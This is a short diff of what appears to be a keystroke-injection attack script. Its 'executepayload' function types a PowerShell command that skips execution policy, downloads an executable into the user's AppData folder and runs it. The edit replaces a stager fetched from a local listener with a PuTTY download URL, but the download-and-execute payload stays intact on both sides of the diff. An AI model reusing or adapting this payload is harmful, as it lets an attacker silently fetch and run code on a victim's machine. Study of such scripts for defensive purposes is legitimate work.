@@ -45,7 +45,7 @@ function win10AsAdmin(program) {
 }
 
 function executepayload() {
-    type("powershell.exe -nop -Exec Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://0.0.0.0:8089/stager.exe', $env:APPDATA + '\stager.exe'); Start-Process $env:APPDATA'\stager.exe' \n");
+    type("powershell.exe -nop -Exec Bypass -Command (New-Object System.Net.WebClient).DownloadFile('https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe', $env:APPDATA + '\putty.exe'); Start-Process $env:APPDATA'\putty.exe' \n");
     
 }
 
